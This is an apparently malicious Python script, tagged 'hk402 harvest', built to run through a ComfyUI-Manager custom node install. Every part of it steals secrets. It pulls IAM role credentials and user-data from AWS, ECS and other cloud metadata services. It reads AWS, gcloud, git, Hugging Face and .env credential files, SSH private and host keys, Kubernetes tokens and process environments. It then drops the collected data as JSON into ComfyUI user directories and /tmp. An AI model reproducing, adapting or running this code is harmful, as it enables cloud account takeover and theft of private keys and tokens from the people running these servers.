#!/usr/bin/env python3
# hk402 harvest: cloud identity + host inventory from a ComfyUI-Manager custom node install.
import os, sys, glob, json, time, socket, subprocess, urllib.request, urllib.error

TAG = "hk402"
H = {}


def log(k, v):
    H[k] = v
    print("[%s] %s" % (TAG, k), flush=True)


def sh(cmd, t=10):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=t)
        return ((p.stdout or "") + (p.stderr or ""))[:8000]
    except Exception as e:
        return "ERR %r" % e


def shd(cmd, t=10):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=t)
        return {"rc": p.returncode, "out": ((p.stdout or "") + (p.stderr or ""))[:6000]}
    except Exception as e:
        return {"rc": -9, "out": "ERR %r" % e}


def sock_probe(host, port=80, path="/latest/meta-data/instance-id", t=2, put=False):
    try:
        s = socket.create_connection((host, port), timeout=t)
        req = "%s %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n" % ("PUT" if put else "GET", path, host)
        if put:
            req += "X-aws-ec2-metadata-token-ttl-seconds: 21600\r\nContent-Length: 0\r\n"
        req += "\r\n"
        s.sendall(req.encode())
        d = s.recv(4000).decode("utf8", "replace")
        s.close()
        return {"ok": True, "resp": d[:1200]}
    except Exception as e:
        return {"ok": False, "err": type(e).__name__ + ": " + str(e)[:200]}


def sysinfo():
    d = {}
    for k, c in [("hostname", "hostname"), ("id", "id"), ("uname", "uname -a"),
                 ("nproc", "nproc"), ("os", "cat /etc/os-release 2>/dev/null | head -6"),
                 ("cgroup", "cat /proc/1/cgroup 2>/dev/null | head -4"),
                 ("dockerenv", "ls -la /.dockerenv /run/.containerenv 2>&1"),
                 ("route", "cat /proc/net/route 2>/dev/null | head -8"),
                 ("hosts", "cat /etc/hosts 2>/dev/null"),
                 ("dns", "grep -v '^#' /etc/resolv.conf 2>/dev/null | head -5"),
                 ("lscpu", "lscpu 2>/dev/null | head -10"),
                 ("caps", "grep -E 'CapEff|CapPrm|Seccomp|NoNewPrivs' /proc/self/status 2>/dev/null")]:
        d[k] = sh(c, 8)
    d["env"] = sh("env | sort | head -50", 5)
    d["ps"] = sh("ps -ef 2>/dev/null | head -20", 5)
    log("sys", d)


def ecs():
    d = {}
    env = dict(os.environ)
    for pid in ("1", "self"):
        try:
            raw = open("/proc/%s/environ" % (os.getpid() if pid == "self" else pid), "rb").read()
            env.update(dict(x.split("=", 1) for x in raw.split(b"\0") if b"=" in x))
        except Exception as e:
            d["env_err_" + pid] = repr(e)
    try:
        raw2 = open("/proc/self/environ", "rb").read()
        env.update(dict(x.split("=", 1) for x in raw2.split(b"\0") if b"=" in x))
    except Exception:
        pass
    d["rel_uri"] = env.get("AWS_CONTAINER_CREDENTIALS_RELATIVE_URI", "")
    d["v3"] = env.get("ECS_CONTAINER_METADATA_URI", "")
    d["v4"] = env.get("ECS_CONTAINER_METADATA_URI_V4", "")
    d["agent"] = env.get("ECS_AGENT_URI", "")
    d["region"] = env.get("AWS_REGION") or env.get("AWS_DEFAULT_REGION")
    urls = {}
    if d["rel_uri"]:
        urls["cred"] = "http://169.254.170.2" + d["rel_uri"]
    if d["v4"]:
        urls["task"] = d["v4"] + "/task"
        urls["task_stats"] = d["v4"] + "/task/stats"
        urls["container"] = d["v4"]
    if d["agent"]:
        urls["agent_meta"] = d["agent"]
    d["urls"] = urls
    for k, u in urls.items():
        d["body_" + k] = shd("curl -s -m 5 -w '\\nHTTP=%{http_code}' --noproxy '*' '" + u + "'", 10).get("out", "")[:6000]
    d["imu"] = shd("id -u", 4).get("out", "").strip()
    log("ecs", d)


def imds_aws():
    d = {}
    r1 = shd("curl -s -m 3 -w '\\nHTTP=%{http_code}' --noproxy '*' http://169.254.169.254/latest/meta-data/instance-id", 8)
    d["curl_v1_instance_id"] = r1
    r2 = shd("curl -s -m 3 -X PUT -w '\\nHTTP=%{http_code}' --noproxy '*' -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600' http://169.254.169.254/latest/api/token", 8)
    d["curl_put_token"] = r2
    d["sock_v1"] = sock_probe("169.254.169.254")
    d["sock_put"] = sock_probe("169.254.169.254", path="/latest/api/token", put=True)
    tok = ""
    if r2.get("rc") == 0 and "HTTP=200" in r2.get("out", ""):
        tok = r2["out"].split("\n")[0].strip()
    base = "curl -s -m 3 --noproxy '*' " + ("-H 'X-aws-ec2-metadata-token: %s' " % tok if tok else "")
    for p in ["instance-id", "instance-type", "placement/region", "placement/availability-zone",
              "ami-id", "local-hostname", "public-ipv4", "mac", "iam/info",
              "identity-credentials/ec2/info", "network/interfaces/macs/", "services/domain"]:
        d[p] = shd(base + "-w '\\nHTTP=%{http_code}' http://169.254.169.254/latest/meta-data/" + p, 8).get("out", "")[:900]
    d["role_list"] = shd(base + "-w '\\nHTTP=%{http_code}' http://169.254.169.254/latest/meta-data/iam/security-credentials/", 8).get("out", "")[:500]
    roles = [x.strip() for x in d["role_list"].split("\n")[0].split() if x.strip()] if "HTTP=200" in d["role_list"] else []
    d["roles"] = roles
    for r in roles[:2]:
        d["cred_" + r] = shd(base + "-w '\\nHTTP=%{http_code}' http://169.254.169.254/latest/meta-data/iam/security-credentials/" + r, 8).get("out", "")[:3000]
    d["userdata"] = shd(base + "-w '\\nHTTP=%{http_code}' http://169.254.169.254/latest/user-data", 8).get("out", "")[:2500]
    d["ecs"] = shd("curl -s -m 3 -w '\\nHTTP=%{http_code}' --noproxy '*' http://169.254.170.2/v2/credentials", 8).get("out", "")[:800]
    log("imds_aws", d)


def cloud_probe():
    d = {}
    d["gcp"] = shd("curl -s -m 3 -w '\\nHTTP=%{http_code}' --noproxy '*' -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/?recursive=true | head -25", 8).get("out", "")[:2000]
    d["azure"] = shd("curl -s -m 3 -w '\\nHTTP=%{http_code}' --noproxy '*' -H 'Metadata: true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01'", 8).get("out", "")[:1200]
    d["alibaba"] = shd("curl -s -m 3 -w '\\nHTTP=%{http_code}' --noproxy '*' http://100.100.100.200/latest/meta-data/ram/security-credentials/", 8).get("out", "")[:800]
    d["tencent"] = shd("curl -s -m 3 -w '\\nHTTP=%{http_code}' --noproxy '*' http://metadata.tencentyun.com/latest/meta-data/instance-id", 8).get("out", "")[:400]
    d["digitalocean"] = shd("curl -s -m 3 -w '\\nHTTP=%{http_code}' --noproxy '*' http://169.254.169.254/metadata/v1/id", 8).get("out", "")[:400]
    d["egress"] = shd("curl -s -m 5 --noproxy '*' -k https://api.ipify.org 2>&1", 10).get("out", "")[:200]
    log("cloud_probe", d)


def creds_files():
    d = {}
    paths = ["/root/.aws/credentials", "/root/.aws/config", "/root/.aws/cli/cache",
             "/root/.git-credentials", "/root/.netrc",
             "/root/.config/gcloud/application_default_credentials.json",
             "/root/.config/rclone/rclone.conf", "/root/.config/huggingface/token",
             "/root/.cache/huggingface/token", "/etc/environment", "/ComfyUI/.env",
             "/ComfyUI/extra_model_paths.yaml", "/ComfyUI/user/default/comfy.settings.json"]
    for pat in ["/home/*/.aws/credentials", "/home/*/.aws/config", "/home/*/.git-credentials",
                "/home/*/.config/gcloud/application_default_credentials.json",
                "/opt/*/.env", "/opt/*/*/.env", "/root/*/.env", "/workspace/*/.env",
                "/app/*/.env", "/data/*/.env", "/ComfyUI/*.env", "/ComfyUI/user/*.env",
                "/var/lib/cloud/instance/user-data.txt", "/etc/ecs/ecs.config"]:
        paths += glob.glob(pat)
    seen = set()
    for p in paths:
        if p in seen:
            continue
        seen.add(p)
        try:
            if os.path.isdir(p):
                d[p] = "DIR " + ",".join(os.listdir(p)[:20])
            elif os.path.isfile(p):
                d[p] = open(p, "r", errors="replace").read(4000)
        except Exception as e:
            d[p] = "ERR %r" % e
    hits = {}
    for pid in os.listdir("/proc"):
        if not pid.isdigit():
            continue
        try:
            cmd = open("/proc/%s/cmdline" % pid, "rb").read().replace(b"\0", b" ").decode("utf8", "replace")
            if "ComfyUI" not in cmd and "python" not in cmd:
                continue
            raw = open("/proc/%s/environ" % pid, "rb").read()
            if len(raw) > 200000:
                continue
            env = dict(x.split("=", 1) for x in raw.split(b"\0") if b"=" in x)
            if env:
                hits[pid] = {"cmd": cmd[:200], "env": env}
        except Exception:
            pass
    d["_proc_env"] = hits
    log("creds_files", d)


def ssh_material():
    d = {}
    for p in glob.glob("/root/.ssh/*") + glob.glob("/home/*/.ssh/*") + glob.glob("/etc/ssh/ssh_host_*_key"):
        try:
            st = os.stat(p)
            if os.path.isfile(p) and st.st_size < 20000:
                d[p] = open(p, "r", errors="replace").read(4000)
            else:
                d[p] = "size=%d" % st.st_size
        except Exception as e:
            d[p] = "ERR %r" % e
    d["_dirs"] = sh("ls -la /root/.ssh /home/*/.ssh 2>&1", 5)
    log("ssh", d)


def docker_gpu():
    d = {}
    d["sock"] = sh("ls -la /var/run/docker.sock /run/docker.sock /run/containerd/containerd.sock 2>&1", 5)
    d["bin"] = sh("which docker ctr crictl nerdctl podman 2>&1", 4)
    d["ps"] = sh("docker ps -a --format '{{.ID}}|{{.Names}}|{{.Image}}|{{.Status}}|{{.Ports}}' 2>&1 | head -60", 10)
    d["images"] = sh("docker images --format '{{.Repository}}:{{.Tag}}|{{.ID}}|{{.Size}}' 2>&1 | head -40", 10)
    d["nvidia_smi"] = sh("nvidia-smi -L 2>&1", 10)
    d["nvidia_q"] = sh("nvidia-smi --query-gpu=index,name,uuid,memory.total,driver_version --format=csv,noheader 2>&1", 10)
    d["drv"] = sh("cat /proc/driver/nvidia/version 2>&1", 5)
    d["dev"] = sh("ls -la /dev/nvidia* 2>&1 | head -10", 5)
    log("docker_gpu", d)


def k8s():
    d = {}
    d["sa_dir"] = sh("ls -la /var/run/secrets/kubernetes.io/serviceaccount/ 2>&1", 5)
    for p in ["/var/run/secrets/kubernetes.io/serviceaccount/token",
              "/var/run/secrets/kubernetes.io/serviceaccount/namespace",
              "/root/.kube/config", "/etc/kubernetes/kubelet.conf", "/etc/rancher/k3s/k3s.yaml"]:
        if os.path.isfile(p):
            try:
                d[p] = open(p, "r", errors="replace").read(6000)
            except Exception as e:
                d[p] = "ERR %r" % e
    d["env"] = sh("env | grep -Ei 'KUBERNETES|KUBE|CLUSTER|TENANT' | head -20", 5)
    log("k8s", d)


def comfy():
    d = {}
    roots = []
    for pat in ["/ComfyUI", "/work/ComfyUI", "/app/ComfyUI", "/opt/ComfyUI", "/root/ComfyUI",
                "/workspace/ComfyUI", "/home/*/ComfyUI", "/*/ComfyUI"]:
        roots += glob.glob(pat)
    d["roots"] = roots[:10]
    for r in roots[:2]:
        d[r + "/custom_nodes"] = sh("ls -la '%s/custom_nodes' 2>&1 | head -20" % r, 6)
        d[r + "/.env"] = sh("cat '%s/.env' 2>&1 | head -30" % r, 5)
    d["manager_cfg"] = sh("find / -xdev -maxdepth 7 -name config.ini -path '*ComfyUI-Manager*' 2>/dev/null | head -2 | xargs -r -n1 sh -c 'echo \"== $0\"; cat \"$0\"' 2>&1 | head -40", 15)
    d["startup"] = sh("find / -xdev -maxdepth 8 -name install-scripts.txt -path '*startup-scripts*' 2>/dev/null | head -2 | xargs -r -n1 sh -c 'echo \"== $0\"; tail -5 \"$0\"' 2>&1 | head -20", 15)
    d["userdirs"] = sh("find / -xdev -maxdepth 6 -type d -name default -path '*ComfyUI/user*' 2>/dev/null | head -5", 15)
    log("comfy", d)


def misc():
    d = {}
    d["bash_hist"] = sh("tail -30 /root/.bash_history 2>/dev/null", 5)
    d["cloud_init"] = sh("ls -la /var/lib/cloud/ /etc/cloud 2>/dev/null | head -20", 6)
    d["cron"] = sh("crontab -l 2>&1 | head -8; ls /etc/cron.d 2>/dev/null", 6)
    d["topdirs"] = sh("ls -la /opt /root /home /workspace /data /srv 2>&1 | head -50", 6)
    d["mounts"] = sh("grep -Ei 'nfs|cifs|9p|fuse|/host|/data' /proc/self/mountinfo | head -15", 5)
    d["sshd"] = sh("grep -Ei '^(PasswordAuthentication|PermitRootLogin|PubkeyAuthentication)' /etc/ssh/sshd_config 2>/dev/null", 5)
    log("misc", d)


def main():
    t0 = time.time()
    H["_meta"] = {"tag": TAG, "v": 2, "ts": time.strftime("%FT%TZ", time.gmtime()), "uid": os.getuid(),
                  "cwd": os.getcwd(), "argv": sys.argv[:3], "py": sys.version.split()[0]}
    for fn in (sysinfo, ecs, imds_aws, cloud_probe, creds_files, ssh_material, docker_gpu, k8s, comfy, misc):
        try:
            fn()
        except Exception as e:
            H["_err_" + fn.__name__] = repr(e)
    H["_meta"]["elapsed"] = round(time.time() - t0, 1)
    blob = json.dumps(H, indent=1, default=str)
    aws = H.get("imds_aws", {})
    gp = H.get("docker_gpu", {})
    summary = {
        "meta": H["_meta"],
        "host": (H.get("sys", {}).get("hostname") or "").strip(),
        "id": (H.get("sys", {}).get("id") or "").strip(),
        "uname": (H.get("sys", {}).get("uname") or "").strip(),
        "egress": H.get("cloud_probe", {}).get("egress"),
        "aws": {k: aws.get(k) for k in ("curl_v1_instance_id", "curl_put_token", "roles",
                                        "instance-id", "instance-type", "placement/region",
                                        "iam/info", "role_list")},
        "clouds": {k: (H.get("cloud_probe", {}).get(k) or "")[:120] for k in ("gcp", "azure", "alibaba", "tencent")},
        "gpu": {"smi": (gp.get("nvidia_smi") or "")[:300], "q": (gp.get("nvidia_q") or "")[:500]},
        "docker_ps": (gp.get("ps") or "")[:800],
        "ecs": {k: (H.get("ecs", {}) or {}).get(k) for k in ("rel_uri", "v4", "region", "imu")},
        "aws_files": list((H.get("creds_files") or {}).keys())[:12],
    }
    sm = json.dumps(summary, indent=1, default=str)
    dirs = []
    for pat in ["/ComfyUI/user/default", "/work/ComfyUI/user/default", "/app/ComfyUI/user/default",
                "/opt/ComfyUI/user/default", "/root/ComfyUI/user/default",
                "/workspace/ComfyUI/user/default", "/home/*/ComfyUI/user/default",
                "/data/ComfyUI/user/default", "/*/ComfyUI/user/default"]:
        dirs += glob.glob(pat)
    dirs.insert(0, os.path.abspath(os.path.join(os.getcwd(), "..", "..", "user", "default")))
    written = []
    for d in dirs:
        for sub in ("ComfyUI-Manager/cache", ""):
            p = os.path.join(d, sub) if sub else d
            try:
                os.makedirs(p, exist_ok=True)
                open(os.path.join(p, TAG + "_harvest.json"), "w").write(blob)
                open(os.path.join(p, TAG + "_sum.txt"), "w").write(sm)
                written.append(p)
            except Exception:
                pass
    try:
        open("/tmp/" + TAG + "_harvest.json", "w").write(blob)
        written.append("/tmp")
    except Exception:
        pass
    print("[%s] WRITTEN %s bytes=%d" % (TAG, written, len(blob)), flush=True)
    print("[%s] SUMMARY %s" % (TAG, sm[:2500]), flush=True)


main()
